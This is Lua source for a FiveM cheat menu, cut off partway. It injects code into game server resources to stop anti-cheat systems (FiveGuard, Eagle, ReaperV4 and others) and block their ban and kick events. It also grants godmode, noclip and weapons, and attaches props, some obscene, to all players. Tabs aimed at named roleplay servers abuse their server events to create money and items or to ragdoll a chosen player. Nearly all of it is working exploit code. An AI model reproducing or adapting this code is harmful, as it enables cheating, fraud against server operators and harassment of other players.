MachoMenuButton(AntiCheatSection, "FiveGuard Bypass", function()
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        print("FiveGuard Bypass: Activating...")
        
        -- Stop FiveGuard resources
        local fiveGuardResources = {
            "FiveGuard", "fiveguard", "FIVEGUARD",
            "fg", "FG", "FiveGuardAC", "fiveguard_ac"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(fiveGuardResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("FiveGuard Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Block FiveGuard events
        local blockedEvents = {
            "FiveGuard:check", "FiveGuard:detect", "FiveGuard:ban",
            "FiveGuard:kick", "FiveGuard:log", "FiveGuard:scan",
            "FiveGuard:validate", "FiveGuard:verify", "FiveGuard:punish"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        -- Hook FiveGuard natives
        local nativesToBlock = {
            0x1DD55701034110E5, 0xFB92A102F1C4DFA3, 0x01FEE67DB37F59B2,
            0xF1B760881820C952, 0x67722AEB798E5FAB, 0xCEDABC5900A0BF97,
            0x6ADAABD3068C5235, 0x475768A975D5AD17, 0x3A87E44BB9A01D54,
            0x8483E98E8B888AE2, 0x937C71165CF334B3, 0x8DECB02F88F428BC,
            0xB0760331C7AA4155, 0x0A6DB4965674D243, 0xB80CA294F2F26749,
            0x34616828CD07F1A1, 0x6C4D0409BA1A2BC2, 0xA200EB1EE790F448
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        print("FiveGuard Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2FiveGuard Bypass:', 'Activated successfully!' } })
    ]])
    
    MachoMenuNotification("FiveGuard", "FiveGuard bypass activated!")
end)

-- Eagle AC Bypass
MachoMenuButton(AntiCheatSection, "Eagle AC Bypass", function()
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        print("Eagle AC Bypass: Activating...")
        
        -- Stop Eagle AC resources
        local eagleResources = {
            "Eagle", "eagle", "EagleAC", "eagle_ac",
            "EC-AC", "EC_AC", "EC-PANEL", "EC_PANEL"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(eagleResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("Eagle AC Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Block Eagle AC events
        local blockedEvents = {
            "Eagle:ban", "Eagle:kick", "Eagle:detect", "Eagle:check",
            "EC-AC:ban", "EC-AC:kick", "EC-AC:detect",
            "EC_AC:ban", "EC_AC:kick", "EC_AC:detect",
            "eagle:ban", "eagle:kick", "eagle:detect",
            "ec-ac:ban", "ec-ac:kick", "ec-ac:detect"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        -- Block Eagle AC NUI
        local _SendNUIMessage = SendNUIMessage
        SendNUIMessage = function(msg)
            if type(msg) == 'table' and msg.action then
                local blockedActions = {"eagle", "ec", "ban", "kick", "detect", "anticheat"}
                for _, action in ipairs(blockedActions) do
                    if string.find(string.lower(msg.action), action) then
                        return
                    end
                end
            end
            return _SendNUIMessage(msg)
        end
        
        print("Eagle AC Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2Eagle AC Bypass:', 'Activated successfully!' } })
    ]])
    
    MachoMenuNotification("Eagle AC", "Eagle AC bypass activated!")
end)

-- ReaperV4 Bypass
MachoMenuButton(AntiCheatSection, "ReaperV4 Bypass", function()
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        print("ReaperV4 Bypass: Activating...")
        
        -- Stop Reaper resources
        local reaperResources = {
            "ReaperV4", "Reaper", "reaper", "REAPER"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(reaperResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("ReaperV4 Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Hook Reaper natives
        local nativesToBlock = {
            0xC6D3D26810C8E0F9, 0x8D4D46230B2C353A, 0xB15162CB5826E9E8,
            0xD5037BA82E12416F, 0xFB92A102F1C4DFA3, 0x19CAFA3C87F7C2FF,
            0xA200EB1EE790F448, 0x5234F9F10919EABA, 0x997ABD671D25CA0B
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        -- Block Reaper events
        local blockedEvents = {
            "Reaper:NewDetection", "Reaper:detection", "Reaper:ban",
            "Reaper:kick", "Reaper:punish", "Reaper:log"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        print("ReaperV4 Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2ReaperV4 Bypass:', 'Activated successfully!' } })
    ]])
    
    MachoMenuNotification("ReaperV4", "ReaperV4 bypass activated!")
end)

-- Stop All Anticheat Resources
MachoMenuButton(AntiCheatSection, "Stop All Anticheat Resources", function()
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        print("Stopping all anticheat resources...")
        
        local antiCheatResources = {
            -- FiveGuard
            "FiveGuard", "fiveguard", "FIVEGUARD", "fg", "FG", "FiveGuardAC",
            -- Eagle AC
            "Eagle", "eagle", "EagleAC", "eagle_ac", "EC-AC", "EC_AC", "EC-PANEL", "EC_PANEL",
            -- Reaper
            "ReaperV4", "Reaper", "reaper", "REAPER",
            -- WX
            "wx_anticheat", "wx-ac", "WX-AC", "WX_AC", "WXAntiCheat", "WX_AntiCheat",
            -- Electron
            "ElectronAC", "electron", "ELECTRON",
            -- Fini
            "FiniAC", "fini", "FINI",
            -- WaveShield
            "WaveShield", "waveshield", "WAVESHIELD",
            -- Generic
            "anticheat", "anti-cheat", "ac", "AntiCheat", "ANTICHEAT"
        }
        
        local stopped = 0
        
        for _, res in ipairs(antiCheatResources) do
            if GetResourceState(res) == "started" then
                pcall(StopResource, res)
                pcall(ExecuteCommand, 'stop ' .. res)
                print("Stopped: " .. res)
                stopped = stopped + 1
            end
        end
        
        print("Stopped " .. stopped .. " anticheat resources")
        TriggerEvent('chat:addMessage', { args = { '^2Anticheat Killer:', 'Stopped ' .. stopped .. ' anticheat resources!' } })
    ]])
    
    MachoMenuNotification("Anticheat Killer", "Stopping all anticheat resources...")
end)

-- ============================================================
-- EAGLE AC SPAWN PROPS (Added to AntiCheatSection)
-- ============================================================

local eaglePropsActive = false
local eaglePropsThread = nil
local eagleAttachedProps = {}

-- Function to stop Eagle Props
local function StopEagleProps()
    eaglePropsActive = false
    eaglePropsThread = nil
    
    -- Clean up all attached objects
    for _, obj in ipairs(eagleAttachedProps) do
        if DoesEntityExist(obj) then
            DeleteEntity(obj)
        end
    end
    eagleAttachedProps = {}
    
    MachoMenuNotification("Eagle Props", "Stopped all prop spawns!")
    print("[Eagle Props] Stopped and cleaned up all objects")
end

-- Function to start Eagle Props
local function StartEagleProps()
    eaglePropsActive = true
    
    MachoInjectResource2(NewThreadNs, "monitor", [[
        eaglePropsActive = true
        local attachedProps = {}
        local players = GetActivePlayers()
        
        if #players == 0 then
            print("[Eagle Props] No players found")
            return
        end
        
        print("[Eagle Props] Starting object attachment on " .. #players .. " players")
        
        for _, pid in ipairs(players) do
            if not eaglePropsActive then break end
            
            local ped = GetPlayerPed(pid)
            local name = GetPlayerName(pid)
            
            if DoesEntityExist(ped) and not IsEntityDead(ped) then
                print("[Eagle Props] Processing: " .. name .. " (ID: " .. pid .. ")")
                
                -- List of objects to attach
                local attachModels = {
                    "prop_windmill_01",
                    "prop_roadcone01a",
                    "prop_barrel_01a",
                    "prop_tyre_01a",
                    "prop_ball_01a",
                    "v_res_tre_stool",
                    "prop_cs_dildo",
                    "prop_cash_crate_01",
                    "prop_med_jet_01",
                    "prop_rub_carpart_01",
                    "prop_skip_01a",
                    "prop_air_bag_01a"
                }
                
                for _, modelName in ipairs(attachModels) do
                    if not eaglePropsActive then break end
                    
                    local model = GetHashKey(modelName)
                    RequestModel(model)
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < 50 do
                        Citizen.Wait(10)
                        attempts = attempts + 1
                    end
                    
                    if HasModelLoaded(model) then
                        local offsetX = math.random(-10, 10) / 10
                        local offsetY = math.random(-10, 10) / 10
                        local offsetZ = math.random(0, 20) / 10
                        
                        local coords = GetEntityCoords(ped)
                        local obj = CreateObject(model, coords.x, coords.y, coords.z, true, true, true)
                        
                        if DoesEntityExist(obj) then
                            AttachEntityToEntity(obj, ped, 0, offsetX, offsetY, offsetZ, 0.0, 0.0, 0.0, false, false, true, false, 2, true)
                            table.insert(attachedProps, obj)
                            
                            -- Store globally for cleanup
                            _G.eagleAttachedProps = attachedProps
                            
                            print("[Eagle Props] Attached " .. modelName .. " to " .. name)
                            
                            -- Spin each object
                            CreateThread(function()
                                while eaglePropsActive and DoesEntityExist(obj) do
                                    local rot = GetEntityRotation(obj)
                                    SetEntityRotation(obj, rot.x, rot.y, rot.z + 5.0, 0, true)
                                    Citizen.Wait(10)
                                end
                            end)
                        end
                    else
                        print("[Eagle Props] Failed to load model: " .. modelName)
                    end
                    Citizen.Wait(200)
                end
            else
                print("[Eagle Props] Player " .. name .. " is invalid or dead")
            end
            Citizen.Wait(500)
        end
        
        print("[Eagle Props] All objects attached. They will auto-cleanup when stopped.")
    ]])
    
    MachoMenuNotification("Eagle Props", "Prop spawn started on all players!")
    print("[Eagle Props] Started")
end

-- Eagle Props Toggle Button
MachoMenuButton(AntiCheatSection, "Toggle Eagle Props", function()
    if eaglePropsActive then
        -- Stop
        StopEagleProps()
    else
        -- Start
        StartEagleProps()
    end
end)

-- Stop Eagle Props Button (Separate)
MachoMenuButton(AntiCheatSection, "Stop Eagle Props", function()
    StopEagleProps()
end)

-- Status Check
MachoMenuButton(AntiCheatSection, "Eagle Props Status", function()
    if eaglePropsActive then
        local count = #eagleAttachedProps
        MachoMenuNotification("Eagle Props", "Active! " .. count .. " objects attached")
        print("[Eagle Props] Active - " .. count .. " objects attached")
    else
        MachoMenuNotification("Eagle Props", "Inactive")
        print("[Eagle Props] Inactive")
    end
end)

print("[Eagle Props] Toggle added to AntiCheatSection!")

-- Toggle Admin Names
MachoMenuButton(SecondSection, "Toggle Admin Names", function()
    TriggerEvent('qb-admin:client:toggleNames')
    MachoMenuNotification("Admin", "Toggling admin names...")
end)

-- Toggle Admin Blips
MachoMenuButton(SecondSection, "Toggle Admin Blips", function()
    TriggerEvent('qb-admin:client:toggleBlips')
    MachoMenuNotification("Admin", "Toggling admin blips...")
end)

-- TX Features Section
-- ============================================================
-- TX NOCLIP WITH INDIVIDUAL BIND KEYS (F2, F5, F7)
-- ============================================================

local txNoclipActive = false
local txNoclipBindF2 = false
local txNoclipBindF5 = false
local txNoclipBindF7 = false

-- Function to toggle TX Noclip
local function ToggleTxNoclip()
    txNoclipActive = not txNoclipActive
    
    if txNoclipActive then
        MachoInjectResource("monitor", [[
            local playerPed = PlayerPedId()
            
            -- Sound effect
            PlaySoundFromEntity(-1, "ent_amb_elec_crackle", playerPed, 0, false, 0)
            
            -- Electricity effect (original txsrc particle)
            CreateThread(function()
                -- Load core asset
                RequestNamedPtfxAsset("core")
                while not HasNamedPtfxAssetLoaded("core") do
                    Wait(1)
                end
                
                UseParticleFxAsset("core")
                
                -- Original txsrc electricity effect
                local particle = StartParticleFxLoopedOnEntity(
                    "ent_dst_elec_fire_sp",
                    playerPed,
                    0.0, 0.0, 0.0,
                    0.0, 0.0, 0.0,
                    1.75,
                    false, false, false
                )
                
                -- Wait 1.5 seconds (same as txsrc)
                Wait(1500)
                
                -- Stop
                if particle then 
                    StopParticleFxLooped(particle, true) 
                end
                
                RemoveNamedPtfxAsset("core")
            end)
        ]])
        
        TriggerEvent('txcl:setPlayerMode', 'noclip')
        MachoMenuNotification("TX System", "Noclip active! Electricity effect added!")
    else
        TriggerEvent('txcl:setPlayerMode', 'none')
        MachoMenuNotification("TX System", "Noclip deactivated!")
    end
end

-- Original Tx Noclip Checkbox
MachoMenuCheckbox(SecondSection, "Tx Noclip - Safe", function()
    ToggleTxNoclip()
end, function()
    if txNoclipActive then
        ToggleTxNoclip()
    end
end)

-- ============================================================
-- INDIVIDUAL KEY BIND OPTIONS
-- ============================================================

MachoMenuText(SecondSection, "TX NOCLIP BIND KEYS")

-- F2 Bind Toggle
MachoMenuCheckbox(SecondSection, "Enable F2 Key", function()
    txNoclipBindF2 = true
    MachoMenuNotification("TX Bind", "F2 key enabled for TX Noclip")
    print("[TX Bind] F2 key enabled for TX Noclip")
end, function()
    txNoclipBindF2 = false
    MachoMenuNotification("TX Bind", "F2 key disabled for TX Noclip")
    print("[TX Bind] F2 key disabled for TX Noclip")
end)

-- F5 Bind Toggle
MachoMenuCheckbox(SecondSection, "Enable F5 Key", function()
    txNoclipBindF5 = true
    MachoMenuNotification("TX Bind", "F5 key enabled for TX Noclip")
    print("[TX Bind] F5 key enabled for TX Noclip")
end, function()
    txNoclipBindF5 = false
    MachoMenuNotification("TX Bind", "F5 key disabled for TX Noclip")
    print("[TX Bind] F5 key disabled for TX Noclip")
end)

-- F7 Bind Toggle
MachoMenuCheckbox(SecondSection, "Enable F7 Key", function()
    txNoclipBindF7 = true
    MachoMenuNotification("TX Bind", "F7 key enabled for TX Noclip")
    print("[TX Bind] F7 key enabled for TX Noclip")
end, function()
    txNoclipBindF7 = false
    MachoMenuNotification("TX Bind", "F7 key disabled for TX Noclip")
    print("[TX Bind] F7 key disabled for TX Noclip")
end)

-- ============================================================
-- BIND KEY DETECTION
-- ============================================================

MachoOnKeyDown(function(vk)
    -- F2 key (113) - only if enabled
    if txNoclipBindF2 and vk == 113 then
        ToggleTxNoclip()
        MachoMenuNotification("TX Bind", "TX Noclip toggled via F2")
        print("[TX Bind] TX Noclip toggled via F2")
    end
    
    -- F5 key (116) - only if enabled
    if txNoclipBindF5 and vk == 116 then
        ToggleTxNoclip()
        MachoMenuNotification("TX Bind", "TX Noclip toggled via F5")
        print("[TX Bind] TX Noclip toggled via F5")
    end
    
    -- F7 key (118) - only if enabled
    if txNoclipBindF7 and vk == 118 then
        ToggleTxNoclip()
        MachoMenuNotification("TX Bind", "TX Noclip toggled via F7")
        print("[TX Bind] TX Noclip toggled via F7")
    end
end)

-- ============================================================
-- STATUS DISPLAY
-- ============================================================

MachoMenuButton(SecondSection, "TX Bind Status", function()
    local status = "F2: " .. (txNoclipBindF2 and "ON" or "OFF") ..
                  " | F5: " .. (txNoclipBindF5 and "ON" or "OFF") ..
                  " | F7: " .. (txNoclipBindF7 and "ON" or "OFF")
    MachoMenuNotification("TX Bind Status", status)
    print("[TX Bind] Status: " .. status)
end)

-- Enable All Keys Button
MachoMenuButton(SecondSection, "Enable All TX Binds", function()
    txNoclipBindF2 = true
    txNoclipBindF5 = true
    txNoclipBindF7 = true
    MachoMenuNotification("TX Bind", "All keys enabled! F2, F5, F7")
    print("[TX Bind] All keys enabled!")
end)

-- Disable All Keys Button
MachoMenuButton(SecondSection, "Disable All TX Binds", function()
    txNoclipBindF2 = false
    txNoclipBindF5 = false
    txNoclipBindF7 = false
    MachoMenuNotification("TX Bind", "All keys disabled!")
    print("[TX Bind] All keys disabled!")
end)

print("[TX Bind] Individual bind system loaded (F2, F5, F7)")

MachoMenuCheckbox(SecondSection, "Tx Godmode - Safe", function()
    txGodmodeActive = true
    TriggerEvent('txcl:setPlayerMode', 'godmode')
    MachoMenuNotification("TX Features", "Godmode active!")
end, function()
    txGodmodeActive = false
    TriggerEvent('txcl:setPlayerMode', 'none')
    MachoMenuNotification("TX Features", "Godmode deactivated!")
end)

MachoMenuCheckbox(SecondSection, "Tx SuperJump - Safe", function()
    txSuperJumpActive = true
    TriggerEvent('txcl:setPlayerMode', 'superjump')
    MachoMenuNotification("TX Features", "SuperJump active!")
end, function()
    txSuperJumpActive = false
    TriggerEvent('txcl:setPlayerMode', 'none')
    MachoMenuNotification("TX Features", "SuperJump deactivated!")
end)

MachoMenuButton(SecondSection, "TX TP Waypoint - Safe", function()
    TriggerEvent("txcl:tpToWaypoint")
end)

MachoMenuButton(FirstSection, "Revive - Safe", function()
    TriggerEvent('hospital:client:Revive', PlayerPedId())
end)

MachoMenuButton(SecondSection, "Tx Car Fix - Safe", function()
    TriggerEvent('txcl:vehicle:fix')
end)

MachoMenuButton(SecondSection, "Tx Wild Attack - Risky", function()
    TriggerEvent('txcl:wildAttack')
end)

MachoMenuButton(SecondSection, "Tx Car Boost - Risky", function()
    TriggerEvent('txcl:vehicle:boost')
end)

MachoMenuText(FirstSection, "Weapon Spawn")

MachoMenuButton(FirstSection, "RPG Spawn - Risky", function()
    GiveWeaponToPed(PlayerPedId(), 'weapon_rpg', 250, false, true)
end)

MachoMenuButton(FirstSection, "Pistol Spawn - Safe", function()
    GiveWeaponToPed(PlayerPedId(), 'weapon_pistol', 250, false, true)
end)

MachoMenuButton(FirstSection, "Glock 19 Spawn - Safe", function()
    GiveWeaponToPed(PlayerPedId(), 'weapon_g19', 250, false, true)
end)

MachoMenuButton(FirstSection, "Remove Current Weapon", function()
    RemoveWeaponFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()))
end)

Citizen.CreateThread(function()
    -- Get server name and IP address
    local serverName = GetConvar("sv_hostname", "N/A")
    local serverIP = GetConvar("sv_endpoint", "N/A")
    
    -- If sv_hostname couldn't be retrieved, use GetCurrentServerEndpoint as alternative
    if serverName == "N/A" then
        serverName = GetCurrentServerEndpoint() or "Unknown Server"
    end
    
    -- Server name check
    if KeysBin == "wex" then
        -- Wex Roleplay tab
        local ThirdTab = MachoMenuAddTab(MenuWindow, "Wex Roleplay")
        local ThirdSection = MachoMenuGroup(ThirdTab, "Wex Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        local InputBoxHandle = MachoMenuInputbox(ThirdSection, "Item to Spawn", "...")
        MachoMenuButton(ThirdSection, "Spawn Item", function()
            local LocatedText = { item = MachoMenuGetInputbox(InputBoxHandle), amount = 1 }

            -- Check item name and amount
            if LocatedText.item and LocatedText.item ~= "" then
                -- Add item to server (correct format)
                MachoInjectResource('m-Tequila', string.format([[
                    TriggerServerEvent('m-Tequila:server:CraftAlcoholic', "%s", %d)
                ]], LocatedText.item, LocatedText.amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item name!")
            end
        end)
    end

    -- Edge Roleplay server operations
    if serverName:find("Edge Roleplay") or serverName:find("edge") then
        local EdgeTab = MachoMenuAddTab(MenuWindow, "Edge Roleplay")
        local JobExploitGroup = MachoMenuGroup(EdgeTab, "Item Exploit", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, 300)

        -- Item name input box
        local InputBoxHandle = MachoMenuInputbox(JobExploitGroup, "Item Code", "e.g., weapon_g19")
        -- Amount input box
        local AmountBoxHandle = MachoMenuInputbox(JobExploitGroup, "Amount", "e.g., 1")

        MachoMenuButton(JobExploitGroup, "Give Item", function()
            local item = MachoMenuGetInputbox(InputBoxHandle)
            local amount = tonumber(MachoMenuGetInputbox(AmountBoxHandle))

            if item and item ~= "" and amount and amount > 0 then
                -- Give item to server
                MachoInjectResource('monitor', string.format([[
                    TriggerServerEvent('horizon_paymentsystem:giveItem', "%s", %d)
                ]], item, amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
            end
        end)
    end

    -- Boz RP Exploit menu integration
    if serverName:find("Boz RP") then
        local ExploitTab = MachoMenuAddTab(MenuWindow, "Boz RP Exploit")
        local ExploitSection = MachoMenuGroup(ExploitTab, "Boz RP Money Glitch", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        -- Exploit status variable
        local exploitRunning = false
        local shouldStop = false

        -- Money exploit start/stop button
        MachoMenuButton(ExploitSection, "Start/Stop Money Exploit", function()
            exploitRunning = not exploitRunning
            if exploitRunning then
                shouldStop = false
                MachoInjectResource('monitor', [[
                    Citizen.CreateThread(function()
                        while true do
                            if shouldStop then
                                break
                            end
                            TriggerServerEvent('akela_karpuz:process')
                            TriggerServerEvent('akela_karpuz:take')
                            Citizen.Wait(20)
                        end
                    end)
                ]])
            else
                shouldStop = true
                MachoInjectResource('monitor', [[
                    shouldStop = true
                    TriggerEvent('chat:addMessage', { args = { '^2Exploit System:', 'Money exploit stopped!' } })
                ]])
            end
        end)
    end

    -- Quasar Roleplay server operations
    if serverName:find("Quasar Roleplay") then
        local ItemExploitTab = MachoMenuAddTab(MenuWindow, "Quasar Roleplay")
        local ItemExploitSection = MachoMenuGroup(ItemExploitTab, "Quasar Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        -- Item name input box
        local ItemInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Item Name", "...")
        -- Amount input box
        local AmountInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Amount", "1")

        MachoMenuButton(ItemExploitSection, "Add Item", function()
            local ItemData = { 
                item = MachoMenuGetInputbox(ItemInputBoxHandle), 
                amount = tonumber(MachoMenuGetInputbox(AmountInputBoxHandle)) or 1 
            }

            if ItemData.item and ItemData.item ~= "" and ItemData.amount > 0 then
                -- Add item to server
                MachoInjectResource('any', string.format([[
                    TriggerServerEvent('sedat:Server:AddItem', "%s", %d)
                ]], ItemData.item, ItemData.amount, ItemData.item, ItemData.amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item name and amount!")
            end
        end)
    end

    -- Valoria Roleplay server operations
    if serverName:find("Valoria Roleplay") then
        local RefundMenuTab = MachoMenuAddTab(MenuWindow, "Valoria Roleplay")
        local ValoriaSection = MachoMenuGroup(RefundMenuTab, "Valoria Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        -- 1. MONEY REFUND
        MachoMenuText(ValoriaSection, "Money Exploit")
        local PaymentTypeInputBoxHandle = MachoMenuInputbox(ValoriaSection, "Payment Type", "Only Cash or Bank")
        local RefundAmountInputBoxHandle = MachoMenuInputbox(ValoriaSection, "Money Amount", "e.g., 10000")

        MachoMenuButton(ValoriaSection, "Spawn Money", function()
            local RefundData = {
                paymentType = MachoMenuGetInputbox(PaymentTypeInputBoxHandle),
                refund = tonumber(MachoMenuGetInputbox(RefundAmountInputBoxHandle)) or 11111,
                playerId = GetPlayerServerId(PlayerId())
            }

            if RefundData.paymentType and RefundData.paymentType ~= "" and RefundData.refund > 0 then
                MachoInjectResource('monitor', string.format([[ 
                    TriggerServerEvent('CL-PoliceGarageV2:RefundRent', '%s', %d, %d, 'policejob') 
                ]], RefundData.paymentType, RefundData.refund, RefundData.playerId))
            else
                MachoMenuNotification("Error", "Please enter a valid payment type and amount!")
            end
        end)

        -- 2. VEHICLE DATA EXPLOIT
        MachoMenuText(ValoriaSection, "Vehicle Data Exploit")
        local InputBoxVehicleName = MachoMenuInputbox(ValoriaSection, "Vehicle Name", "e.g., sultan")

        MachoMenuButton(ValoriaSection, "Send Vehicle", function()
            local vehicleName = MachoMenuGetInputbox(InputBoxVehicleName)

            if vehicleName ~= "" then
                MachoInjectResource('CL-PoliceGarageV2', string.format([[ 
                    local QBCore = exports['monitor']:GetCoreObject() 
                    local veh = GetVehiclePedIsIn(PlayerPedId(), false) 
                    TriggerServerEvent("CL-PoliceGarageV2:AddData", "vehiclepurchased", "%s", QBCore.Functions.GetVehicleProperties(veh), "police") 
                ]], vehicleName, vehicleName))
            else
                MachoMenuNotification("Error", "Vehicle name cannot be empty!")
            end
        end)

        -- 3. ITEM GIVING (JIM)
        MachoMenuText(ValoriaSection, "Item Exploit")
        local InputBoxItemCode = MachoMenuInputbox(ValoriaSection, "Item Code", "e.g., sandwich")
        local InputBoxItemAmount = MachoMenuInputbox(ValoriaSection, "Amount", "e.g., 3")

        MachoMenuButton(ValoriaSection, "Give Item", function()
            local item = MachoMenuGetInputbox(InputBoxItemCode)
            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1

            if item ~= "" and amount > 0 then
                MachoInjectResource('drones', string.format([[
                    TriggerServerEvent("Drones:Back", -1, "%s", %d)
                ]], item, amount, item, amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
            end
        end)
    end

    -- AriaV / Lena Roleplay
    if serverName:find("AriaV") then
        local LenaRoleplayTab = MachoMenuAddTab(MenuWindow, "AriaV")
        local LenaRoleplaySection = MachoMenuGroup(LenaRoleplayTab, "AriaV", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        -- Inputs: Item Name and Amount
        local KodInputHandle = MachoMenuInputbox(LenaRoleplaySection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(LenaRoleplaySection, "Code Amount", "Example: 3")

        -- Button: Item Exploit
        MachoMenuButton(LenaRoleplaySection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))

            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end

            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end

            -- Inject with random item selection
            MachoInjectResource("ox_inventory", string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]], itemKod, miktar))
            MachoMenuNotification("Success", "Item exploit sent!")
        end)

        -- Player ID text input (Tackle)
        local TackleTargetIdInputBoxHandle = MachoMenuInputbox(LenaRoleplaySection, "Target Player ID", "Example: 123")

        -- Tackle Button (with MachoInjectResource)
        MachoMenuButton(LenaRoleplaySection, "Ragdoll Player", function()
            local targetId = tonumber(MachoMenuGetInputbox(TackleTargetIdInputBoxHandle))
            if targetId and targetId > 0 then
                MachoInjectResource('monitor', string.format([[ 
                    TriggerServerEvent("tackle:server:TacklePlayer", %d) 
                ]], targetId))
                MachoMenuNotification("Lena Roleplay", "Ragdoll sent! Target ID: " .. targetId)
            else
                MachoMenuNotification("Error", "Please enter a valid player ID!")
            end
        end)
    end

    -- Rena Roleplay
    if serverName:find("Rena Roleplay") then
        local RenaMenuTab = MachoMenuAddTab(MenuWindow, "Rena Roleplay")
        local RenaSection = MachoMenuGroup(RenaMenuTab, "Rena Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, 150)

        MachoMenuText(RenaSection, "Money Exploit")

        local DropDownHandle = MachoMenuDropDown(RenaSection, "Drop Down", 
            function(Index)
                if Index == 0 then
                    MachoInjectResource('monitor', [[
                        local data = {
                            probability = { b = 540, a = 380 },
                            type = "weapon",
                            name = "weapon_g17",
                            count = 1,
                            sound = "mystery"
                        }

                        TriggerServerEvent('luckywheel:give', data)
                    ]])
                elseif Index == 2 then
                    MachoInjectResource('monitor', [[
                        TriggerServerEvent('qb-trashsearch:server:searchedTrash', 889090, false, "weapon_bottle")
                    ]])
                elseif Index == 4 then
                    -- No specific action defined for this option
                else
                    MachoMenuNotification("Error", "This option not found!")
                end
            end, 
            "G17",
            "Bottle",
            "Toast"
        )
    end

    -- Atlantis Roleplay
    if serverName:find("Atlantis Roleplay") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "Atlantis Roleplay")
        local TradeSection = MachoMenuGroup(TradeTab, "Atlantis Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
    
        -- Item Exploit
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
    
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
    
            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end
    
            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end
    
